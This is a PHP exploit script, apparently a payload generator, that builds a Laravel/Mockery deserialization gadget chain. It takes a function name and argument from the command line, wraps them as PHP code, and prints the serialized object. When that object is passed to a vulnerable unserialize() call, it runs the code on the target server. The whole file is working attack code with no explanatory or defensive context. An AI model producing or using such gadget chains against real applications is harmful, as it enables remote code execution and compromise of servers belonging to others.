<?php


namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;

        function __construct()
        {
            $this->queueResolver = [new \Mockery\Loader\EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;

        function __construct($evilCode)
        {
            $this->events = new \Illuminate\Bus\Dispatcher();
            $this->event = new BroadcastEvent($evilCode);
        }
    }

    class BroadcastEvent {
        public $connection;

        function __construct($evilCode)
        {
            $this->connection = new \Mockery\Generator\MockDefinition($evilCode);
        }

    }
}

namespace Illuminate\Support {
    class MessageBag {
        protected $messages = [];
        protected $format;

        function __construct($inner) {
            $this->format = $inner;
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Mockery\Generator {
    class MockDefinition {
        protected $config;
        protected $code;

        function __construct($evilCode)
        {
            $this->code = $evilCode;
            $this->config = new MockConfiguration();
        }
    }

    class MockConfiguration {
        protected $name = 'abcdefg';
    }
}

namespace Y4tacker
{

    class Exp
    {

        public function generate(array $parameters)
        {
            $code = '<?php ' . $parameters['code'] . ' exit; ?>';
            $expected = new \Illuminate\Broadcasting\PendingBroadcast($code);
            $res = new \Illuminate\Support\MessageBag($expected);
            return serialize($res);

        }
    }
}

namespace {
    $function = $argv[1];
    $parameter = $argv[2];
    $a = new \Y4tacker\Exp();
    $parameters['code'] = $function."(\"".$parameter."\");";
    $b = $a->generate($parameters);
    echo $b;

}